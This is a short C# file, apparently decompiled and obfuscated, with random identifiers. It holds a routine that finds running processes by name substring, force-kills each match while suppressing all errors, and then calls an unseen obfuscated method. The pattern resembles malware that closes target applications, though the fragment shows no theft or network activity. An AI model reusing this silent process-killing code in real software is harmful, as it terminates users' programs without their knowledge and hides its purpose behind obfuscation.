using System;
using System.Diagnostics;

namespace HSFBHZCtMXjPES;

public sealed class bQckxPMzxDjj
{
	public static bool ehgItJGGpEoZD(Process process_0, string string_0)
	{
		try
		{
			return process_0.ProcessName.ToLower().Contains(string_0.ToLower());
		}
		catch (InvalidOperationException)
		{
			return false;
		}
		catch (NullReferenceException)
		{
			return false;
		}
		catch
		{
			return false;
		}
	}

	public static void sERSDJNPedtpzVO(string string_0, string string_1)
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (ehgItJGGpEoZD(process, string_0.ToLower()))
			{
				try
				{
					process.Kill();
					process.WaitForExit();
					UzNyTypkvLt.oUCKpBBKSBqKN();
				}
				catch (InvalidOperationException)
				{
				}
				catch (PlatformNotSupportedException)
				{
					break;
				}
				catch
				{
				}
			}
		}
	}
}
